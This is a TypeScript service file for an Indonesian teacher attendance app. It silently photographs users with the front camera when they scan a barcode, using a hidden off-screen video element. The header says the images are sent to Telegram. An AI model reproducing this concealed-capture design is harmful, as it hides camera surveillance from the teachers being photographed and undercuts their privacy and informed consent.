/**
 * Smart Absensi Guru - Silent Camera Capture Service
 * 
 * Mengambil foto kamera depan secara hening di latar belakang saat guru memindai barcode.
 * Didesain tanpa menampilkan elemen visual / UI pada antarmuka guru, kepsek, atau admin.
 * Hasil foto dikompresi (~30-50 KB) dan dikirim langsung dari browser ke Telegram Bot API
 * sehingga 100% bebas beban di Vercel (bypassing Vercel Serverless Function).
 */
export class SilentCameraCaptureService {
  /**
   * Mengambil satu frame foto dari kamera depan secara silent.
   * Resolves Blob JPEG atau null jika izin belum ada atau kamera tidak tersedia.
   */
  public static async captureFrontCameraSilently(): Promise<Blob | null> {
    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
      return null;
    }

    let stream: MediaStream | null = null;
    let video: HTMLVideoElement | null = null;

    try {
      // 1. Dapatkan stream kamera depan dengan resolusi ringan (640x480)
      stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      });

      // 2. Buat elemen video in-memory yang tak terlihat sama sekali (off-screen)
      video = document.createElement('video');
      video.muted = true;
      video.playsInline = true;
      video.autoplay = true;
      video.style.position = 'fixed';
      video.style.top = '-9999px';
      video.style.left = '-9999px';
      video.style.width = '1px';
      video.style.height = '1px';
      video.style.opacity = '0';
      video.style.pointerEvents = 'none';
      video.setAttribute('aria-hidden', 'true');
      document.body.appendChild(video);

      video.srcObject = stream;

      // 3. Tunggu video siap (maksimal 700ms)
      await new Promise<void>((resolve) => {
        const timeout = setTimeout(resolve, 700);
        video!.onloadedmetadata = () => {
          video!.play().catch(() => {});
        };
        video!.onloadeddata = () => {
          clearTimeout(timeout);
          // Berikan jeda 150ms agar auto-exposure sensor kamera HP sempat menyesuaikan cahaya
          setTimeout(resolve, 150);
        };
        video!.onerror = () => {
          clearTimeout(timeout);
          resolve();
        };
      });

      const width = video.videoWidth || 640;
      const height = video.videoHeight || 480;

      // 4. Render frame ke canvas in-memory dan konversi ke Blob JPEG (quality 0.65)
      const canvas = document.createElement('canvas');
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d');

      let blob: Blob | null = null;
      if (ctx && width > 0 && height > 0) {
        ctx.drawImage(video, 0, 0, width, height);
        blob = await new Promise<Blob | null>((resolve) => {
          canvas.toBlob((b) => resolve(b), 'image/jpeg', 0.65);
        });
      }

      return blob;
    } catch {
      // Tangani jika perangkat tidak memiliki kamera depan atau stream ditolak
      return null;
    } finally {
      // 5. Bersihkan seluruh hardware tracks dan DOM elemen segera
      if (video && video.parentNode) {
        try {
          video.srcObject = null;
          video.parentNode.removeChild(video);
        } catch {}
      }

      if (stream) {
        try {
          stream.getTracks().forEach((track) => track.stop());
        } catch {}
      }
    }
  }
}
